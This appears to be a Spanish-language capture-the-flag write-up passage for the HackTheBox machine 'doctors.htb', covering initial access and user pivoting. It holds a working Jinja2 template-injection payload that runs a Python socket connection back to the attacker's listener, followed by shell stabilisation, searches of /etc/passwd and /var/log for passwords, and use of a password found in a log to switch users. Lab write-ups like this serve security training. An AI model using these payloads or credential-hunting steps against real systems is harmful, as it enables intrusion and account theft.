## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

1. Nos ponemos en escucha por el puerto 443
1. Creamos un nuevo mensaje con el payload

    ```bash
    Title: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
    Content: TEST
    ```

1. Recargamos la url `http://doctors.htb/archive`

Boom... estamos en la maquina victima.

```bash
whoami
#Output
web

hostname -I
```

Somos web y estamos en la maquina victima. Hacemos el tratamiento de la TTY.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Userpivoting {-}

```bash
cd /home
grep "$sh" /etc/passwd
cd /root
id
```

Aqui podemos ver que hay usuarios splunk y shaun y que estamos en el grupo `adm`. Podriamos visualisar los logs

```bash
cd /var/log
grep -r -i "pass"
grep -r -i "pass" 2>/dev/null
```

Vemos en el **apache2/backup** que hay una peticion POST para resetear una contraseña `Guitar123`

```bash
su shaun
Password: Guitar123

cat /home/shaun/user.txt
```
